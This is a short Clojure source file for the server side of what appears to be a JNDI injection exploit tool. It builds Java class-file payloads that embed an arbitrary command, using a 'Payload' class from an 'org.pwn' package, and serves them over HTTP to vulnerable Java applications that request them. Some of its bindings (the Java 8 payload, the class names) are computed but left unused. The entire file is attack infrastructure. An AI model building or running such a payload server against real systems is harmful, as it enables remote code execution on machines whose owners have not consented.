(ns jndi-injector-clj.server
  (:import [org.pwn
            Payload]
           [javassist.bytecode
            ClassFile]))

(defn gen-handler [app-conf]
  (let [command (:command app-conf)
        class-name7 (:class-name (:java7 app-conf))
        class-name8 (:class-name (:java8 app-conf))
        payload-7 (Payload/build command ClassFile/JAVA_7)
        payload-8 (Payload/build command ClassFile/JAVA_8)]
   (fn [request]
    (println "[+] incoming request " (:uri request))
    {:status 200
     :body payload-7})))